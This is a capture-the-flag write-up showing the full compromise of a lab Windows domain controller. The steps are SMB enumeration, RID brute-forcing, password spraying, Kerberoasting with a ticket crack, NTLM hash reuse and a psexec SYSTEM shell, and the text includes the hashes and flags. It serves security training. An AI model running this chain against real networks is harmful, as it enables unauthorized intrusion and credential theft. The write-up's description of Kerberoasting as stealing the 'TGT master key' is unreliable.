# CTF Writeup: Soupdecode 01

---

# Reconaissance

An initial port scan revealed the following information

```
nmap -n -Pn -sS -p- 10.10.136.67 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 06:13 CDT
Nmap scan report for 10.10.136.67
Host is up (0.032s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
49673/tcp open  unknown
49715/tcp open  unknown
49790/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 307.59 seconds
```

An service version detection scan reveals more information

```
nmap -n -Pn -sSCV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49669,49673,49715,49790 10.10.136.67
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 06:35 CDT
Nmap scan report for 10.10.136.67
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-12 11:35:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-12T11:36:43+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-12T11:36:03+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49715/tcp open  msrpc         Microsoft Windows RPC
49790/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-12T11:36:04
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.49 seconds
```

Within the service version detection scan we can retrieve crucial information e.G the domain controller enumerated in the RDP Service.. If we map it to the ip in our local dns hosts file, we could 
potentially enumerate users on the Active Directory.

```
sudo echo "10.10.136.67 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
```

The nmap version revealed that smb is open on the default port 445.
My first initiative is to try anonymous enumeration of smb shares by utilizing smbclient.


```
smbclient -L \\\\soupedecode.local\\
Password for [WORKGROUP\unkn0wn]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to soupedecode.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## Initial Access

As we can see from the result null authentification with smbclient worked and we retrieved all the smb shares running on the target.

Next objective should be to enumerate potential users on the target. To potentially password-spray/bruteforce credentials.

For that task I utilized the tool "nxc".

```
nxc smb soupedecode.local -u 'guest' -p '' --rid-brute
```

I decided to not add the output, because there is to many users on the target.
To reduce the amount of the RID's in our wordlist, I filtered out only the real users of the system and removed the rest.

```
cat wordlist.txt | cut -d '\' -f2 | cut -d ' ' -f1 
```

This command extracts text that appears between the first backslash and the first space in each line of the file.
So DOMAIN\pleto nano will be outputted pleto

Copied all the correctly filtered output inside a file named "wordlist2.txt"

Now that we have an wordlist of potential users, we can try to enumerate user credentials, our first initiative is to
use this wordlist for both username & password. 

```
nxc smb soupedecode.local -u wordlist2.txt -p wordlist2.txt --no-bruteforce 
SMB         10.10.136.67    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         10.10.136.67    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

As you can see from the results, we gained credentials from user ybob317

```
ybob317:ybob317
```

Logging in with those credentials inside the User share worked.

```
smbclient \\\\soupedecode.local\\Users -U ybob317
Password for [WORKGROUP\ybob317]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Jul  4 17:48:22 2024
  ..                                DHS        0  Wed Jun 18 17:14:47 2025
  admin                               D        0  Thu Jul  4 17:49:01 2024
  Administrator                       D        0  Fri Sep 12 06:17:58 2025
  All Users                       DHSrn        0  Sat May  8 03:26:16 2021
  Default                           DHR        0  Sat Jun 15 21:51:08 2024
  Default User                    DHSrn        0  Sat May  8 03:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 03:14:03 2021
  Public                             DR        0  Sat Jun 15 12:54:32 2024
  ybob317                             D        0  Mon Jun 17 12:24:32 2024

                12942591 blocks of size 4096. 10723699 blocks available
smb: \>
```

Retrieved user.txt in C:\Users\ybob317\Desktop

```
28189316c25dd3c0ad56d44d000d62a8
```

## Privilege Escalation & more Enumeration

Unfortunately we are not able to retrieve the root.txt flag, because our access is denied in the Administrator Directory.

So a way to potentially elevate privileges or gain higher priv user credentials. Is "Kerberoasting" which is the process of trying to steal
the master key or .tgt file and then trying to crack it and retrieve credentials. In this process
the Attacker isn't breaking the strong Kerberos encryption. Instead, they are abusing a built-in feature to get a ticket (.tgt file/master key)
and attack it with a password-cracking tool e.G John The Ripper.

To steal the .tgt master key we can utilize the following tool impacket-GetUserSPNs.
It will request a TGT Ticket / Master Key for our user (ybob317) and all the service accounts 
in our wordlist. We can then get the Master Key locally of an certain service account
e.G Administrator and crack it locally.

```
impacket-GetUserSPNs 'soupedecode.local/ybob317:ybob317' -request -usersfile wordlist2.txt -dc-ip soupedecode.local 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$SOUPEDECODE.LOCAL$*krbtgt*$0dc2ebfc744a69ed6db0df73$aa6a575216b6a9b7585f93354cb3f75824b057ec656ee7013ebc49e2653368fb82c4372395aac1e348f7dacd33cadad9c6b9f66ff487b1cea3ac6709354ca023f25a66ffa0c2db68ebd251fd4558591e0a2eda33cd036dd87c3626635f84633a68739a9b781bbdfed4b39cfcbdab366192385029298fb616fe61e33a6f4b436eee76c1ca3eccf6810b059772525bd857db1c87a13652819a24977ebf072d328af8f2e6b19ff6afdfb1ec1bc3ff010ca164370cd79a60627d4fd921a0b68517d01e4801a82b7bae4908110a912cf1daf245ccfd85b53ee4463e6bcae5ceb85a4c5c843378f0c547e172bee67f5fb3981ed14b646cc5296b3f9a24d7b7ead459c74b6e782aa6a0a70f2768de411521ece2a7604896dc1fcc060d8be16d9feadeff2fed41b26a47bf6b9c992e72104bcf1afb98e7cf40d97d4bf86d84ea4c42c729aaa3629bd4be5cacd7c1398c6fd2615e66bb9113f93f247effda0749d80a5557e5ae0238b8795ea7333cc21b69714147eff11952800a3e920e7b0d615a75d07b73cbaf474edbcd878583e9b4191a9220ecce0ff0e413b07bd178f7879ac16d04e8aa2aa5bbf7c087513fdf6d4b35136484cad3d86e3fe9cc7ac02358a54bc189b2a619605f421fe599deadc4d9b91b7e2bf49ed408c4092e57c294cdc3fa2876efa4d8487843e7575c8b616f496a0fd7f1343581e71c5c7da9c8cbafee12cb2fa6e9fca71cbac432a47f02b148b9764133d407bafbcddddbe20f4abd752ababd724815591851d15c6a62881b11c8be7c08863fd951d9f538d7938f38ff151c38ba1087a3e62836d7f39276018366e98bf218bbbf94db310d8db5c4a1fb6cfc20a0fbe8d6a793efa4d0778849afa0bd1be3589a319d35c5c1d5d5620ec72fe94744f80f15d3cb8d184c4fc0fcaa0c1eda023706801cdae6578bcf468a2ddf47859b019f1d4882c40fd0c4701d476c225bd988b3849f407315f72959c8b7ce6bb7dd9cf60b91f7948ff73e79ab1ba67e3373076dd2e46655b839f7126bfdf57de1fa2389d691f96f0758d02982a7d0d303901fb6bfd51ccd537316bfb83991da4a93304c7336421b6144a16463c7c7e0e8dc8c7a9cb90a65d778fd6f60c87199a526e1db816ac377d1a81f3e96330e194ecd3cbb1a857426032fa6c5e09664b3d72fb674fcbbba866fe5498c0f8547eac1a586ad3f161ec61e8a6ef3019239396496feec6ccd17b65a0dc16f6b7e9e8b2b94b053da866c7ba6efe65a6b9417d85e7692dd10103f3c23bd8f2517ccfe593d1ccce4fb1853221a9388d92c24b99bc1e4cb0214aeec69cb0dbbee384017c062b6c29d1858ed9b7b861ee9220670dd1ef69a92c66b4b9c08d6bf2d46e67bd746332d63787c6efc4eb30f041736bd32b519baf8d6383053eca17c84d8c1681fc02a631f1199781c3ea89f1e6e63d1e4dde5e31e6128a59875edd6f679d4345c405373be4ea17a4d3ff6bc59fdf92dc25c48e2999861887ec715b5232b15becf68e8e2ce323d8987a0d122868497048a7daae932131cf7d90648
[-] Principal: bmark0 - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: otara1 - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: kleo2 - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: eyara3 - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: pquinn4 - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jharper5 - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found
```

The output itself revealed way more master keys / tgt hashes. Then I displayed here, but it was to much.
I have saved up the encrypted master key of file_svc service account inside an file_svc.tgs file.

```
cat file_svc.tgs 
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$file_svc*$d619346794838693af0f6fe2dc602663$8e4254b498e8b782ea6c73049cc3c50959816cdbd9e6fad5de97a37529ca72b501393f13ac456d46cc81b4e4e5f0d95b9bb9c072ce76e1de031795f445a60a3407bee45c3b3af84f1b2666b0f05f55c9acd9efb8b913ca678d9e19c929ae70cd258034f7c0d853122de7351011e43dab4f6d90b251f966f7cb42a6cf832c86c515acfdfe5eded7e01c3d7f91a7da3653e95f92464b68d6d3887ba6521ed4afed5cccda46dd85799f7c3e2747d55f2d8d16339a32fdc0474850edbe7293f0bff163d0442d0fe7b2cd3ba6c2310eb3a81212fd0ad43cc61e94f1ab3293d942fe72617b03c453d8a6f07e891d1778ee8a5cd839dff83fb88425f0ad5b71241f58c448ef082fa7bef884e67fff922707740287c99dc3fbb34e23dd045b00c9c6abe1313dbee228c7bc85b8568cb6a82e3a103b2ea3f9acd6821e4ccb2e8efe9f6d9992cb12fcaaf30d3c22f25e3a48c42e6cb89906d70d6eaf1751acd7d4f10565b8dd28bd1ec5da923a9e876138884f100168a3ad7b055fea51a023a4e91508bc40df2e9779fb87ce9a4d98ad02f7f010aaa4d392be5c295d5968ed09b6f41f12809332ab157adb32cea3c2e9ff1fea28fd02aa17e7913a5f2b87eca5dccd613f09a53ed00fa9b5c1264321cf7b94c2577f45c079e74adf8067072bb014867085d497e30a833f54c54a0b173290787619dac52e7093c598c7805389e9550a0a8d80a673c034c0135de74e0e20f76af6aaf31812f53ba1d21229981586d5921700c0140fa9f81ecfdaaa8ca000cb5f2bfb7ae99d649ed6f56bfaf2fd5c6afeacc5c0177a87a3e119037125d081eab6726311afd643878c5221e7a882bb2e923b1cb1a28c05c513aab84d885f6e80a12d3b557f0edcebc54fe66f5363ed11b8fe8fce38f474ce515939be1104866ed5bb745c0d19a53c6e1f9bb06d17db36b47123442bbf2c8df6ba386cd1f29c0242bc42184e64596c34b8269369a8ba65229f2cdf67e80c1ce4c032c5852d8fd957b7a6302eaf36d11144bb7bb6767c3fb761550afdb7f3772f58093956ca024744843110fb605b1b71f562804d1b9d4271359a3bad13e55b6e9b487d0e9f20bbdbf480dc60b031997491a2bafdfb75f5a7594d5aca3faace2113092b275a73704fd0044f5d8e6ff515caa05a272d39d720ae5a57d3655f65d325307874825672134bd71d36b24f029b124eded1a506fa328e6b7cff6cc737056297c380145564feeac14fb60af7ad882c919e683d127424f9b0e10ef565c5b79c6500347e483ec76b6762268d3a8cf9ef251a3905a0007733c59e3a10b3ee2da1e8111c3eac39f38313dd4360fa1745c70bb838bd74e1e20b26c88cb529e4627c59fec0d3e4c06e0cb0c961e7b5791243d56bc0c5b53b54ca382c3c071ba1dbe7ee29e5c3669a412eb5d0c518042bbf1e2d8d69cb7c8eab59c7c17fe078e250f67d4cd710fa0cc6b53b25cd85bc30e775303a627c8dbfaff0ebe7c8
```

Now since we have the master key on our local machine, we can try to crack the key utilizing john the ripper.

```
john file_svc.tgs --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?)     
1g 0:00:00:03 DONE (2025-09-12 09:39) 0.2583g/s 2773Kp/s 2773Kc/s 2773KC/s Pauliann..Partygurl
Use the "--show" option to display all of the cracked passwords reliably
```

Logging into backup smb share using the credentials we gained file_svc:Password123!! gave us a file.

```
smbclient \\\\soupedecode.local\\backup -U file_svc
Password for [WORKGROUP\file_svc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jun 17 12:41:17 2024
  ..                                 DR        0  Fri Jul 25 12:51:20 2025
  backup_extract.txt                  A      892  Mon Jun 17 03:41:05 2024

                12942591 blocks of size 4096. 10725272 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (6.0 KiloBytes/sec) (average 6.0 KiloBytes/sec)
smb: \>
```

Apparently the file stored a lot of credentials / NTLM Hashes.

```
cat backup_extract.txt                                               
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

To check which of these accounts are valid, we can utilize nxc.
But before that we need to create wordlists containing just the user accounts and NTLM Hashes.
We can utilize the following command for this:

```
cat backup_extract.txt | cut -d ':' -f1 > machines.txt
```
```
cat backup_extract.txt | cut -d ':' -f4 > hashes.txt
```
```
nxc smb soupedecode.local -u machines.txt -H hashes.txt --no-bruteforce
```

It revealed that following output:

```
nxc smb soupedecode.local -u machines.txt -H hashes.txt --no-bruteforce
SMB         10.10.65.121    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.65.121    445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.10.65.121    445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.10.65.121    445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
SMB         10.10.65.121    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

The machine/user "FileServer$" seemed to work with the corresponding NTLM Hash, the Hint "(Pwn3d!)" also means that the account has 
Administrator Access. We should be able to retrieve the root.txt, logging in with this user.

To check which shares we can access with this machine account, we can run the following command:

```
nxc smb soupedecode.local -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 --shares

SMB         10.10.65.121    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.65.121    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.10.65.121    445    DC01             [*] Enumerated shares
SMB         10.10.65.121    445    DC01             Share           Permissions     Remark
SMB         10.10.65.121    445    DC01             -----           -----------     ------
SMB         10.10.65.121    445    DC01             ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.65.121    445    DC01             backup                          
SMB         10.10.65.121    445    DC01             C$              READ,WRITE      Default share
SMB         10.10.65.121    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.65.121    445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.65.121    445    DC01             SYSVOL          READ,WRITE      Logon server share 
SMB         10.10.65.121    445    DC01             Users
```

We have READ & WRITE Access in ADMIN$ Share.

We can now utilize "impacket-psexec" to get a shell on the target system with high privs.


```
impacket-psexec 'soupedecode.local/FileServer$'@soupedecode.local -hashes :e41da7e79a4c76dbd9cf79d1cb325559             
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on soupedecode.local.....
[*] Found writable share ADMIN$
[*] Uploading file PKhtqgIT.exe
[*] Opening SVCManager on soupedecode.local.....
[*] Creating service cEbh on soupedecode.local.....
[*] Starting service cEbh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
27cb2be302c388d63d27c86bfdd5f56a
```
